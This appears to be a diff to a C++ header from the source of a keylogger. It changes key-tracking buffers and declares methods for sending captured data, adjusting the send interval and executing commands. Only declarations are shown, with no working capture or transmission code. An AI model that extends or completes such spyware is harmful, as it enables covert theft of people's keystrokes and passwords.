@@ -17,7 +17,7 @@ public:
 
 private:
 
-    void CheckKey(short vkey, bool shift);
+    void CheckKey(short vkey);
     void Send();
 	void IncreaseSendInterval();
 	void DecreaseSendInterval();
@@ -27,8 +27,9 @@ private:
 
     CommandExe cmd;
 
-    std::vector<const char*> keysPressed;
-    bool keysActive[256 + 1];
+    std::vector<std::tstring> keysPressed;
+    BYTE keysActive[256];
+	WCHAR keyBuf[256];
 };
 
 extern Keylogger keylogger;
